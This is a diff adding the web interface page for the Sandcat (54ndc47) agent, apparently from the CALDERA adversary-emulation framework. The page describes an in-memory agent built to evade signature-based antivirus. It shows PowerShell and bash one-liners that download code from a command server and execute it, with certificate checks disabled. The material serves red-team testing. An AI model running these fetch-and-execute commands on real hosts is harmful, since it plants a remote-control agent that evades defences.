@@ -1,0 +1,71 @@
+<html>
+    <head>
+        <title>Sandcat | 54ndc47</title>
+        <link rel="shortcut icon" type="image/png" href="/gui/img/favicon.png"/>
+        <link rel="stylesheet" href="/gui/css/shared.css">
+        <link rel="stylesheet" href="/gui/css/navbar.css">
+        <link rel="stylesheet" href="/sandcat/css/basic.css">
+    </head>
+    <body style="margin-bottom: 100px">
+        <script>
+          document.body.className = 'fade';
+        </script>
+        <div class="topnav">
+          <a href="/">Home</a>
+          <a href="/plugin/sandcat/gui" class="active">54ndc47</a>
+          <div class="topnav-right">
+            <a href="/logout">Logout</a>
+          </div>
+        </div>
+
+        <div>
+
+            <div class="row" style="background-color: inherit">
+                <div class="column" style="flex: 25%;margin-top:50px;">
+                    <center>
+                        <table>
+                            <tr>
+                                <td>
+                                    <img id="pawprint2" style="height:200px;;margin-right:100px;" src="/sandcat/img/pawprint.png">
+                                </td>
+                            </tr>
+                        </table>
+                        <div class="sandcat">
+                            <img id="pawprint" src="/sandcat/img/pawprint.png">
+                        </div>
+                    </center>
+                </div>
+                <div class="column" style="flex: 75%;margin-top:50px;">
+                    <center>
+                        <div class="sandcat" style="float:left">
+                            <h1>54ndc47</h1>
+                            <h2 style="margin-top:-85px">chain mode remote code executor</h2>
+                            <p>
+                                A sandcat is a desert cat that leaves no footprint. In that vein, the CALDERA
+                                54ndc47 is an agent designed to run only in RAM,
+                                never touching the file system. In this way, it can bypass many signature-based
+                                anti-virus programs. Run a variant on any host to test.
+                            </p>
+                            <br>
+                            <div>
+                                <pre id="pshDelivery">$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}</pre>
+                                <pre id="bashDelivery">eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"</pre>
+                            </div>
+                        </div>
+                    </center>
+                </div>
+            </div>
+
+        </div>
+    </body>
+    <script>
+      document.addEventListener("DOMContentLoaded", function(e) {
+        document.body.className = '';
+      });
+    </script>
+    <script src="/gui/jquery/jquery.js"></script>
+    <script>
+        $('#pawprint').fadeOut(6000);
+        $('#pawprint2').fadeOut(9000);
+    </script>
+</html>
